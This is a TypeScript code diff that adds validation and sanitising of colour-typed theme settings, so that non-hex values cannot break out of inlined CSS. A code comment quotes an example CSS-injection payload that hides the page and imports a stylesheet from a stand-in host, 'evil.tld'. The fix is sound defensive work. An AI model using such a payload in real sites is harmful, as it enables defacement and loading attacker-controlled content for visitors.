@@ -125,6 +125,30 @@ function checkSelect(
 
 const HEX_COLOR = /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{4}|[0-9a-fA-F]{6}|[0-9a-fA-F]{8})$/;
 
+export function isSafeHexColor(value: unknown): value is string {
+  return typeof value === 'string' && HEX_COLOR.test(value);
+}
+
+// Strip any non-hex value from color-typed `@custom.*` entries before they reach
+// the template. Themes inline these into `<style>` blocks (see Source theme's
+// `--background-color: {{@custom.site_background_color}}`), where Handlebars'
+// HTML-escape does not protect against CSS-context breakouts like
+// `red; } body { display: none } @import url('//evil.tld'); /*`. Either user
+// config or a malicious theme default can supply such a string, so we enforce
+// the hex shape at the rendering boundary regardless of source.
+export function sanitizeThemeCustomValues(
+  values: Record<string, unknown>,
+  schema: Record<string, ThemeCustomSettingDefinition>,
+): Record<string, unknown> {
+  const out: Record<string, unknown> = { ...values };
+  for (const [key, def] of Object.entries(schema)) {
+    if (def.type !== 'color') continue;
+    if (!(key in out)) continue;
+    if (!isSafeHexColor(out[key])) out[key] = '';
+  }
+  return out;
+}
+
 function checkColor(key: string, value: unknown): ThemeCustomValueIssue | undefined {
   if (typeof value !== 'string') {
     return { key, reason: `expected color string, got ${describeValue(value)}` };
